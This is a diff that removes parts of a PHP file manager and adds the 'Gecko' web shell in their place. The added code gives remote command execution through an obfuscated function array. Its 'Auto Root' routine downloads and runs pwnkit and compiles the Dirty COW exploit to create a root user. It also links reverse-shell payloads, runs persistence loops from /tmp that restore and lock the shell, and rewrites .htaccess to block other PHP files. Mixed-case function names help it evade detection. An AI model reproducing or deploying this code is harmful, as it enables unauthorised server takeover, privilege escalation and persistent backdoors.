-	return '<tr><td class="row1"><input id="fm_config_'.$value.'" name="fm_config['.$value.']" value="1" '.(empty($fm_config[$value])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$value.'">'.$name.'</td></tr>';
-}
-
-function fm_protocol() {
-	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';
-	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';
-	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';
-	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';
-	return 'http://';
-}
-
-function fm_site_url() {
-	return fm_protocol().$_SERVER['HTTP_HOST'];
-}
-
-function fm_url($full=false) {
-	$host=$full?fm_site_url():'.';
-	return $host.'/'.basename(__FILE__);
-}
-
-function fm_home($full=false){
-	return '&nbsp;<a href="'.fm_url($full).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';
-}
-
-function fm_run_input($lng) {
-	global $fm_config;
-	$return = !empty($fm_config['enable_'.$lng.'_console']) ? 
-	'
-				<form  method="post" action="'.fm_url().'" style="display:inline">
-				<input type="submit" name="'.$lng.'run" value="'.strtoupper($lng).' '.__('Console').'">
-				</form>
-' : '';
-	return $return;
-}
-
-function fm_url_proxy($matches) {
-	$link = str_replace('&amp;','&',$matches[2]);
-	$url = isset($_GET['url'])?$_GET['url']:'';
-	$parse_url = parse_url($url);
-	$host = $parse_url['scheme'].'://'.$parse_url['host'].'/';
-	if (substr($link,0,2)=='//') {
-		$link = substr_replace($link,fm_protocol(),0,2);
-	} elseif (substr($link,0,1)=='/') {
-		$link = substr_replace($link,$host,0,1);	
-	} elseif (substr($link,0,2)=='./') {
-		$link = substr_replace($link,$host,0,2);	
-	} elseif (substr($link,0,4)=='http') {
-		//alles machen wunderschon
-	} else {
-		$link = $host.$link;
-	} 
-	if ($matches[1]=='href' && !strripos($link, 'css')) {
-		$base = fm_site_url().'/'.basename(__FILE__);
-		$baseq = $base.'?proxy=true&url=';
-		$link = $baseq.urlencode($link);
-	} elseif (strripos($link, 'css')){
-		//как-то тоже подменять надо
-	}
-	return $matches[1].'="'.$link.'"';
-}
- 
-function fm_tpl_form($lng_tpl) {
-	global ${$lng_tpl.'_templates'};
-	$tpl_arr = json_decode(${$lng_tpl.'_templates'},true);
-	$str = '';
-	foreach ($tpl_arr as $ktpl=>$vtpl) {
-		$str .= '<tr><td class="row1"><input name="'.$lng_tpl.'_name[]" value="'.$ktpl.'"></td><td class="row2 whole"><textarea name="'.$lng_tpl.'_value[]"  cols="55" rows="5" class="textarea_input">'.$vtpl.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';
-	}
-return '
-<table>
-<tr><th colspan="2">'.strtoupper($lng_tpl).' '.__('templates').' '.fm_run_input($lng_tpl).'</th></tr>
-<form method="post" action="">
-<input type="hidden" value="'.$lng_tpl.'" name="tpl_edited">
-<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>
-'.$str.'
-<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.fm_url().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
-</form>
-<form method="post" action="">
-<input type="hidden" value="'.$lng_tpl.'" name="tpl_edited">
-<tr><td class="row1"><input name="'.$lng_tpl.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$lng_tpl.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>
-<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>
-</form>
-</table>
-';
-}
-
-function find_text_in_files($dir, $mask, $text) {
-    $results = array();
-    if ($handle = opendir($dir)) {
-        while (false !== ($entry = readdir($handle))) {
-            if ($entry != "." && $entry != "..") {
-                $path = $dir . "/" . $entry;
-                if (is_dir($path)) {
-                    $results = array_merge($results, find_text_in_files($path, $mask, $text));
-                } else {
-                    if (fnmatch($mask, $entry)) {
-                        $contents = file_get_contents($path);
-                        if (strpos($contents, $text) !== false) {
-                            $results[] = str_replace('//', '/', $path);
+<body>
+    <div class="list-shell">
+        <ul>
+            <li><?= $fungsi[11](); ?></li>
+            <li><?= $_SERVER[$fungsi[23]]; ?></li>
+            <li>Server IP : <?= $_SERVER['SERVER_ADDR']; ?> & Your IP : <?= $_SERVER['REMOTE_ADDR']; ?></li>
+            <li>Domains : <?= symlinkDomain(); ?></li>
+            <li>
+                User : <?= $fungsi[22](); ?>
+            </li>
+            <form action="" method="post" enctype="<?= $fungsi[32] ?>">
+                <li><input type="file" name="gecko-file" id=""><input type="submit" class="upload-submit" name="upload-submit" value="Upload"></li>
+            </form>
+        </ul>
+        <div class="tool-menu-header">
+            <div class="list-tool">
+                <ul class="tool-menu">
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=root-terminal" class=""><i class="fa-solid fa-code"></i>&nbsp;Auto Root</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
+                    <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&backdoor=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Backdoor Destroyer</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&lock=shell" class=""><i class="fa-solid fa-lock"></i></i>&nbsp;Lock Shell</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&lock=file" class=""><i class="fa-solid fa-lock"></i></i>&nbsp;Lock File++</a></li>
+                    <li><a href="https://github.com/MadExploits/Gecko/" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
+                </ul>
+            </div>
+        </div>
+        <br>
+    </div>
+    <div class="border">
+        <div class="pwd">
+            <form action="" method="post">
+                <div class="pwd-body">
+                    <?php
+                    $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
+                    $pwd = explode("/", $cwd);
+                    foreach ($pwd as $id => $val) {
+                        if ($val == '' && $id == 0) {
+                            echo '<a href="?dir=' . hex('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
+                            continue;
                         }
+                        if ($val == '') continue;
+                        echo '<a href="?dir=';
+                        for ($i = 0; $i <= $id; $i++) {
+                            echo hex($pwd[$i]);
+                            if ($i != $id) echo hex("/");
+                        }
+                        echo '">' . $val . ' / ' . '</a>';
+                    }
+                    ?>
+                </div>
+                <div class="settings">
+                    <select name="action-gecko" id="" class="action-gecko">
+                        <option value="delete">Delete</option>
+                        <option value="unzip">Unzip</option>
+                    </select>
+                    <input type="submit" class="select-submit" value="Submit" name="gecko-submit">
+                </div>
+        </div>
+        <table style="width:100%;">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Permission</th>
+                    <th>Date</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- FOLDER NYA -->
+                <?php foreach ($scdir as $dir) : ?>
+                    <?php if ($fungsi[18]($dir)) : ?>
+                        <tr>
+                            <td>
+                                <input type="checkbox" name="check-gecko[]" id="folder" value="<?= $dir; ?>">&nbsp;<label for="folder"><i class="fa-solid fa-folder"></i>&nbsp;<a href="?dir=<?= hex($cwd . "/" . $dir); ?>" class="link-shell"><?= $dir; ?></a>
+                            </td>
+                            <td>[ DIR ]</td>
+                            <td><?php if ($fungsi[19]($fungsi[9]() . '/' . $dir)) echo '<font color="#00ff00">';
+                                elseif (!$fungsi[20]($fungsi[9]() . '/' . $dir)) echo '<font color="red">';
+                                echo perms($fungsi[9]() . '/' . $dir);
+                                ?>
+                            </td>
+                            <td>
+                                <?php echo date(
+                                    "Y-m-d H:i",
+                                    $fungsi[24]($dir)
+                                ); ?>
+                            </td>
+                            <td>
+                                <a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $dir ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $dir ?>"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
+                            </td>
+                        </tr>
+                    <?php endif; ?>
+                <?php endforeach; ?>
+                <!-- FILE NYA -->
+                <?php foreach ($scdir as $_file) : ?>
+                    <?php if ($fungsi[17]($_file)) : ?>
+                        <tr>
+                            <td>
+                                <input type="checkbox" name="check-gecko[]" id="folder" value="<?= $_file; ?>">&nbsp;<label for="folder"><i class="fa-regular fa-file"></i>&nbsp;<a href="?dir=<?= hex($cwd . "/"); ?>&f=<?= $_file; ?>" class="link-shell"><?= $_file; ?></a>
+                            </td>
+                            <td><?= formatSize($fungsi[21]($_file)); ?></td>
+                            <td>
+                                <?php if ($fungsi[19]($fungsi[9]() . '/' . $_file)) {
+                                    echo '<font color="#00ff00">';
+                                } elseif (!$fungsi[20]($fungsi[9]() . '/' . $_file)) {
+                                    echo '<font color="red">';
+                                }
+                                echo perms($fungsi[9]() . '/' . $_file);
+                                ?>
+                            </td>
+                            <td>
+                                <?php echo date(
+                                    "Y-m-d H:i",
+                                    $fungsi[24]($_file)
+                                ); ?>
+                            </td>
+                            <td>
+                                <a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_file ?>"><i class="fa-solid fa-file-pen"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&download=<?= $_file ?>"><i class="fa-solid fa-download"></i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $_file ?>"><i class="fa-solid fa-user-pen"></i></a>&nbsp;
+                            </td>
+                        </tr>
+                    <?php endif; ?>
+                <?php endforeach; ?>
+            </tbody>
+        </table>
+    </div>
+    <br>
+    </form>
+    <?php
+    if ($_GET['create'] == True) :
+    ?>
+        <div class="create">
+            <div class="modal">
+                <?php if ($_GET['create'] == "file") :  ?>
+                    <header>
+                        <h2><?= '<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File'; ?></h2>
+                    </header>
+                    <form action="" method="post">
+                        <input type="text" name="create_file" id="" placeholder="&nbsp;Nama File">
+                    <?php elseif ($_GET['create'] == "folder") : ?>
+                        <header>
+                            <h2><?= '<i class="fa-solid fa-folder-plus">&nbsp;</i>Create Folder'; ?></h2>
+                        </header>
+                        <form action="" method="post">
+                            <input type="text" name="create_folder" id="" placeholder="&nbsp;Nama Folder">
+                        <?php endif; ?>
+                        <ul>
+                            <li><input type="submit" name="submit-modal" class="btn-modal fw-bold" value="Submit"></li>
+                            <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                        </ul>
+                        </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php
+    if ($_GET['action'] == "terminal") :
+    ?>
+        <div class="terminal-content">
+            <div class="terminal">
+                <div class="terminal-body">
+                    <header>
+                        <h3><i class="fa-solid fa-terminal"></i>&nbsp;</h3>
+                        <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
+                    </header>
+                    <form action="" method="post">
+                        <center>
+                            <input type="text" placeholder="uname -a" name="terminal" class="terminal-input" autofocus>
+                            <input type="submit" value=">" name="submit-terminal" class="terminal-submit">
+                        </center>
+                    </form>
+                    <?php if (isset($_POST['submit-terminal'])) :  ?>
+                        <textarea class="output-terminal" disabled><?= htmlspecialchars($fungsi[14]($_POST['terminal'] . " 2>&1")); ?></textarea>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['action'] == "root-terminal") : ?>
+        <div class="terminal-content">
+            <div class="terminal">
+                <div class="terminal-body">
+                    <header>
+                        <h3><i class="fa-solid fa-terminal"></i>&nbsp;</h3>
+                        <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a>
+                    </header>
+                    <form action="" method="post">
+                        <center>
+                            <input type="text" placeholder="root@terminal~#" name="terminal-root" class="terminal-input" autofocus>
+                            <input type="submit" value=">" name="submit-root" class="terminal-submit">
+                        </center>
+                    </form>
+                    <?php if (isset($_POST['submit-root'])) :  ?>
+                        <textarea class="output-terminal" disabled>
+<?php
+                        $terminal = $_POST['terminal-root'];
+                        if ($terminal == "root") {
+                            echo "\n[+] Downloading The source \n";
+                            echo _mad_cmd("wget " . $GLOBALS['fungsi'][34] . " --no-check-certificate");
+                            echo "[!] Chmod file pwnkit....\n";
+                            echo _mad_cmd("chmod +x pwnkit");
+                            echo "[+] Testing if this kernel vulnerable...\n";
+                            echo "[!] This kernel version is " . kernel_angka() . " \n";
+                            if (suggest_exploit() == "5.11") {
+                                echo "[!] This Kernel Maybe Vuln Dirtypipe\n";
+                            } else if (suggest_exploit() == "4.10") {
+
+                                echo "[!] This Kernel Maybe Vuln PTRACE_TRACEME\n";
+                            } else if (suggest_exploit() == "2.6.22" || suggest_exploit() == "3.9." . True . "") {
+
+                                echo _mad_cmd("wget " . $GLOBALS['fungsi'][35] . " -O dirty.c --no-check-certificate");
+                                echo _mad_cmd("gcc -pthread dirty.c -o dirty -lcrypt");
+                                echo _mad_cmd("chmod +x dirty");
+                                echo "Creating Password using 'MrMad'\n";
+                                echo _mad_cmd("./dirty mrmad");
+                                echo "Done rooting please check firts using cat /etc/passwd\n";
+                                echo "You Can running that user using sh firefart@" . $_SERVER['SERVER_ADDR'] . "\n";
+                                echo "DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!\n";
+                                echo "mv /tmp/passwd.bak /etc/passwd";
+                                echo 'Exploit adopted by Christian "FireFart" Mehlmauer';
+                                exit;
+                            } else if (distro_linux() == "Debian" || distro_linux() == "Ubuntu" || distro_linux() == "Centos") {
+                                echo "[!] This Kernel Maybe Vuln Pwnkit\n";
+                            } else if (suggest_exploit() == "5.16.11" || suggest_exploit() == "5.15.25" || suggest_exploit() == "5.10.102") {
+                                echo "This Kernel Maybe Vuln Dirtypipe \n";
+                                echo "Dirty Pipe - CVE-2022-0847\n";
+                                echo "Backconnect source: https://github.com/MadExploits/Reverse-Shell-Payload\n";
+                                echo "Exploit Source: https://github.com/0xIronGoat/dirty-pipe\n";
+                            } else if (suggest_exploit() == "4.19.2" || suggest_exploit() == "4.15." . True . "") {
+                                echo "This Kernel Maybe Vuln Subuid\n";
+                                echo "Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method)\n";
+                                echo "Backconnect source: https://github.com/MadExploits/Reverse-Shell-Payload\n";
+                                echo "Exploit Source: https://www.exploit-db.com/download/47165\n";
+                            }
+                            echo _mad_cmd('./pwnkit "id" > mad-pwnkit');
+                            $check_vulnerable = $GLOBALS['fungsi'][27](__DIR__ . "/mad-pwnkit");
+                            $explode_mad_pwkit = explode(" ", $check_vulnerable);
+                            if ($explode_mad_pwkit[0] == "uid=0(root)") {
+                                echo "[~] This Kernel is vulnerable congrats!\n";
+                            } else {
+                                echo "[!] This kernel is not Vulnerable Sorry :)";
+                                return;
+                            }
+                            echo "[+] Giving Permission on mad-pwnkit\n";
+                            echo _mad_cmd("chmod +x mad-pwnkit");
+                            if (!_mad_cmd('./pwnkit "id"')) {
+                                echo "[!] Cannot running pwnkit";
+                            } else {
+                                echo "[!] Done Sir. now u can running on root user!";
+                                exit;
+                            }
+                        }
+?>
+                        </textarea>
+                    <?php endif; ?>
+                </div>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php
+    if (isset($_POST['submit-modal'])) {
+        if ($_POST['create_file']) {
+            $file = $_POST['create_file'];
+            if ($fungsi[25]($file)) {
+                echo success();
+            } else {
+                echo failed();
+            }
+        } elseif ($_POST['create_folder']) {
+            $folder = $_POST['create_folder'];
+            if ($fungsi[26]($folder)) {
+                echo success();
+            } else {
+                echo failed();
+            }
+        }
+    } ?>
+    <br>
+    <?php
+    if (isset($_GET['f'])) :
+    ?>
+        <div class="file-box">
+            <div class="file-content">
+                <form action="" method="post">
+                    <div class="file-header">
+                        <ul>
+                            <li><button type="submit" name="submit-file"><i class="fa-regular fa-floppy-disk"></i>&nbsp;Save</button></li>
+                            <li><a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $_GET['f'] ?>" class="link-rename"><i class="fa-solid fa-pen-to-square"></i>&nbsp;Rename</a></li>
+                            <li> <a href="?dir=<?= hex($fungsi[9]()); ?>"><i class="fa-solid fa-xmark"></i></a></li>
+                        </ul>
+                    </div>
+                    <textarea name="text-file"><?php echo htmlspecialchars($fungsi[27]($_GET['f'])); ?></textarea>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['rename'] == True) : ?>
+        <div class="create">
+            <div class="modal">
+                <header>
+                    <h2><?= $_GET['rename'] ?></h2>
+                </header>
+                <form action="" method="post">
+                    <input type="text" name="rename" id="" placeholder="&nbsp;File/Folder">
+                    <ul>
+                        <li><input type="submit" name="submit-rename" class="btn-modal fw-bold" value="Submit"></li>
+                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                    </ul>
+                </form>
+            </div>
+        </div>
+
+    <?php endif; ?>
+    <?php if ($_GET['chmod'] == True) : ?>
+        <div class="create">
+            <div class="modal">
+                <header>
+                    <h2><?= $_GET['chmod'] ?></h2>
+                </header>
+                <form action="" method="post">
+                    <input type="number" style="width:100%" name="chmod" id="" placeholder="&nbsp;775">
+                    <ul>
+                        <li><input type="submit" name="submit-chmod" class="btn-modal fw-bold" value="Submit"></li>
+                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                    </ul>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+    <?php if ($_GET['lock'] == "file") : ?>
+        <div class="create">
+            <div class="modal">
+                <header>
+                    <h2>Lock Files</h2>
+                </header>
+                <form action="" method="post">
+                    <input type="text" name="lock-file" id="" placeholder="&nbsp;File Name">
+                    <ul>
+                        <li><input type="submit" name="submit-lock-file" class="btn-modal fw-bold" value="Submit"></li>
+                        <li><a href="?dir=<?= hex($fungsi[9]()); ?>">Close</a></li>
+                    </ul>
+                </form>
+            </div>
+        </div>
+    <?php endif; ?>
+</body>
+
+</html>
+
+<?php
+
+if ($_GET['lock'] == "shell") {
+    $tmp = "/tmp";
+    _mad_cmd("cp " . namaFile() . " " . $tmp . "/Acx0" . awalanFile(namaFile()) . "wplers0x.do.not.remove.this.Lock");
+    $text = '
+    <?php
+    $tmp = "/tmp";
+    $fileperm = gecko_perm("' . namaFile() . '");
+    gecko_cmd("chmod 444 ' . namaFile() . '");
+    while (True) {
+        if (!file_exists("' . namaFile() . '")) {
+            $var = base64_encode(file_get_contents($tmp . "/Acx0' . awalanFile(namaFile()) . 'wplers0x.do.not.remove.this.Lock"));
+            FiLe_pUt_ConTentS("' . namaFile() . '", base64_decode($var));
+        }
+        if ($fileperm != "0444") {
+            gecko_cmd("chmod 444 ' . namaFile() . '");
+        }
+    }
+    function gecko_cmd($value)
+    {
+        if (function_exists("system")) {
+            sYsTem($value);
+        } else if (function_exists("shell_exec")) {
+            return ShEll_eXeC($value);
+        } else if (function_exists("exec")) {
+            return ExEc($value);
+        } else if (function_exists("passthru")) {
+            return pAsSThRu($value);
+        }
+    }
+    function gecko_perm($flename){
+        return substr(sprintf("%o", fileperms($flename)), -4);
+    }
+    ';
+    if (file_exists('/tmp/Acx0' . awalanFile(namaFile()) . 'wplers0x.do.not.remove.this.Lock')) {
+        FiLe_pUt_ConTentS($tmp . "/as" . pwdnostrip() . "pxha" . awalanFile(namaFile()) . "ndler0.Lock", $text);
+        _mad_cmd("nohup php " . $tmp . "/as" . pwdnostrip() . "pxha" . awalanFile(namaFile()) . "ndler0.Lock &");
+    }
+}
+if ($_GET['backdoor'] == True) {
+    // check if htaccess have this code
+    $file_htaccess = $fungsi[27]($_SERVER[$fungsi[33]] . "/.htaccess");
+    $cari_code = explode('<', $file_htaccess);
+    if (!end($cari_code) == '/FilesMatch>') {
+        // pengecekan nama file sekarang
+        $namafile = $_SERVER['SCRIPT_FILENAME'];
+        $fileUtama = explode("/", $namafile);
+        $htaccess_text = '
+<FilesMatch ".ph*|Ph*|pH*|PH*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+<FilesMatch "' . end($fileUtama) . '|index.php|index.html|*.png|.htaccess">
+    Order Deny, Allow
+    Allow from all
+</FilesMatch>';
+        $document_root = $_SERVER[$fungsi[33]];
+        $cmd = $fungsi[14]("echo '" . $htaccess_text . "' >> " . $document_root . "/.htaccess");
+        if ($cmd) {
+            echo success();
+        } else {
+            echo failed();
+        }
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-lock-file'])) {
+    $fileNama = $_POST['lock-file'];
+    if (file_exists($fileNama)) {
+        $tmp = "/tmp";
+        _mad_cmd("cp " . $fileNama . " " . $tmp . "/Acx0" . awalanFile($fileNama) . "wplers0x.do.not.remove.this.Lock");
+        $text = '
+    <?php
+
+    $tmp = "/tmp";
+    $fileperm = gecko_perm("' . $fileNama . '");
+    gecko_cmd("chmod 444 ' . $fileNama . '");
+    while (True) {
+        if (!file_exists("' . $fileNama . '")) {
+            $var = base64_encode(file_get_contents($tmp . "/Acx0' . awalanFile($fileNama) . 'wplers0x.do.not.remove.this.Lock"));
+            FiLe_pUt_ConTentS("' . $fileNama . '", base64_decode($var));
+        }
+        if ($fileperm != "0444"){
+            gecko_cmd("chmod 444 ' . $fileNama . '");
+        }
+    }
+    function gecko_cmd($value)
+    {
+        if (function_exists("system")) {
+            sYsTem($value);
+        } else if (function_exists("shell_exec")) {
+            return ShEll_eXeC($value);
+        } else if (function_exists("exec")) {
+            return ExEc($value);
+        } else if (function_exists("passthru")) {
+            return pAsSThRu($value);
+        }
+    }
+    function gecko_perm($flename){
+        return substr(sprintf("%o", fileperms($flename)), -4);
+    }
+    ';
+        if (file_exists('/tmp/Acx0' . awalanFile($fileNama) . 'wplers0x.do.not.remove.this.Lock')) {
+            FiLe_pUt_ConTentS($tmp . "/acxds" . pwdnostrip() . "" . awalanFile($fileNama) . "ds.Lock", $text);
+            _mad_cmd("nohup php " . $tmp . "/acxds" . pwdnostrip() . "" . awalanFile($fileNama) . "ds.Lock &");
+        }
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-chmod'])) {
+    $numberChmod = $_POST['chmod'];
+    $chm_o_d = chmod($fungsi[9] . "/" . $_GET['chmod'], is_int($numberChmod));
+    if ($chm_o_d) {
+        echo success();
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['upload-submit'])) {
+    $name_file = $_FILES['gecko-file']['name'];
+    $tmp_name = $_FILES['gecko-file']['tmp_name'];
+    $move = MoVe_UpLoAdEd_FiLe($tmp_name, $fungsi[9]() . "/" . $name_file);
+    if ($move) {
+        echo success();
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-rename'])) {
+    $new_name = $_POST['rename'];
+    $re_name = rename($fungsi[9]() . "/" . $_GET['rename'], $new_name);
+    if ($re_name) {
+        echo success();
+    } else {
+        echo failed();
+    }
+}
+
+if (isset($_POST['submit-file'])) {
+    $textarea = $_POST['text-file'];
+    $write = $fungsi[28]($fungsi[9]() . "/" . $_GET['f'], $textarea);
+    if ($write) {
+        echo success();
+    } else {
+        echo failed();
+    }
+}
+
+
+
+if (isset($_POST['gecko-submit'])) {
+    $item = $_POST['check-gecko'];
+    if ($_POST['action-gecko'] == "delete") {
+        foreach ($item as $it) {
+            $repl = str_replace("\\", "/", $fungsi[9]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if ($fungsi[18]($fd) || $fungsi[17]($fd)) {
+                $rmdir = unlinkDir($fd);
+                $rmfile = $fungsi[30]($fd);
+                if ($rmdir || $rmfile) {
+                    echo success();
+                } else {
+                    echo failed();
+                }
+            }
+        }
+    }
+}
+
+function success()
+{
+    return '<meta http-equiv="refresh" content="0;url=?dir=' . hex($GLOBALS['fungsi'][9]()) . '&response=success">';
+}
+function failed()
+{
+    return '<meta http-equiv="refresh" content="0;url=?dir=' . hex($GLOBALS['fungsi'][9]()) . '&response=failed">';
+}
+
+function _mad_cmd($de)
+{
+    $out = '';
+    try {
+        if (function_exists('shell_exec')) {
+            return @$GLOBALS['fungsi'][0]($de);
+        } else if (function_exists('system')) {
+            @$GLOBALS['fungsi'][3]($de);
+        } else if (function_exists('exec')) {
+            $exec = array();
+            @$GLOBALS['fungsi'][1]($de, $exec);
+            $out = @join("\n", $exec);
+            return $exec;
+        } else if (function_exists('passthru')) {
+            @$GLOBALS['fungsi'][2]($de);
+        } else if (function_exists('popen') && function_exists('pclose')) {
+            if (is_resource($f = @$GLOBALS['fungsi'][5]($de, "r"))) {
+                $out = "";
+                while (!@feof($f))
+                    $out .= fread($f, 1024);
+                return $out;
+                $GLOBALS['fungsi'][6]($f);
+            }
+        } else if (function_exists('proc_open')) {
+            $pipes = array();
+            $process = @$GLOBALS['fungsi'][4]($de . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
+            $out = @$GLOBALS['fungsi'][8]($pipes[1]);
+            return $out;
+        } else if (class_exists('COM')) {
+            $madWs = new COM('WScript.shell');
+            $exec = $madWs->$GLOBALS['fungsi'][1]('cmd.exe /c ' . $_POST['alfa1']);
+            $stdout = $exec->StdOut();
+            $out = $stdout->ReadAll();
+        }
+    } catch (Exception $e) {
+    }
+    return $out;
+}
+
+
+
+function unlinkDir($dir)
+{
+    $dirs = array($dir);
+    $files = array();
+    for ($i = 0;; $i++) {
+        if (isset($dirs[$i]))
+            $dir =  $dirs[$i];
+        else
+            break;
+
+        if ($openDir = opendir($dir)) {
+            while ($readDir = @readdir($openDir)) {
+                if ($readDir != "." && $readDir != "..") {
+
+                    if ($GLOBALS['fungsi'][18]($dir . "/" . $readDir)) {
+                        $dirs[] = $dir . "/" . $readDir;
+                    } else {
+
+                        $files[] = $dir . "/" . $readDir;
                     }
                 }
             }
         }
-        closedir($handle);
     }
-    return $results;
+
+
+
+    foreach ($files as $file) {
+        $GLOBALS['fungsi'][30]($file);
+    }
+    $dirs = array_reverse($dirs);
+    foreach ($dirs as $dir) {
+        $GLOBALS['fungsi'][29]($dir);
+    }
 }
 
-
-/* End Functions */
-
-// authorization
-if ($auth['authorize']) {
-	if (isset($_POST['login']) && isset($_POST['password'])){
-		if (($_POST['login']==$auth['login']) && ($_POST['password']==$auth['password'])) {
-			setcookie($auth['cookie_name'], $auth['login'].'|'.md5($auth['password']), time() + (86400 * $auth['days_authorization']));
-			$_COOKIE[$auth['cookie_name']]=$auth['login'].'|'.md5($auth['password']);
-		}
-	}
-	if (!isset($_COOKIE[$auth['cookie_name']]) OR ($_COOKIE[$auth['cookie_name']]!=$auth['login'].'|'.md5($auth['password']))) {
-		echo '
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>'.__('File managerx').'</title>
-</head>
-<body>
-<form action="" method="post">
-'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;
-'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;
-<input type="submit" value="'.__('Enter').'" class="fm_input">
-</form>
-'.fm_lang_form($language).'
-</body>
-</html>
-';  
-die();
-	}
-	if (isset($_POST['quit'])) {
-		unset($_COOKIE[$auth['cookie_name']]);
-		setcookie($auth['cookie_name'], '', time() - (86400 * $auth['days_authorization']));
-		header('Location: '.fm_site_url().$_SERVER['REQUEST_URI']);
-	}
+function formatSize($bytes)
+{
+    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
+    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
+    return (round($bytes, 2) . " " . $types[$i]);
 }
 
-// Change config
-if (isset($_GET['fm_settings'])) {
-	if (isset($_GET['fm_config_delete'])) { 
-		unset($_COOKIE['fm_config']);
-		setcookie('fm_config', '', time() - (86400 * $auth['days_authorization']));
-		header('Location: '.fm_url().'?fm_settings=true');
-		exit(0);
-	}	elseif (isset($_POST['fm_config'])) { 
-		$fm_config = $_POST['fm_config'];
-		setcookie('fm_config', serialize($fm_config), time() + (86400 * $auth['days_authorization']));
-		$_COOKIE['fm_config'] = serialize($fm_config);
-		$msg = __('Settings').' '.__('done');
-	}	elseif (isset($_POST['fm_login'])) { 
-		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];
-		$fm_login = json_encode($_POST['fm_login']);
-		$fgc = file_get_contents(__FILE__);
-		$search = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $fgc, $matches);
-		if (!empty($matches[1])) {
-			$filemtime = filemtime(__FILE__);
-			$replace = str_replace('{"'.$matches[1].'"}',$fm_login,$fgc);
-			if (file_put_contents(__FILE__, $replace)) {
-				$msg .= __('File updated');
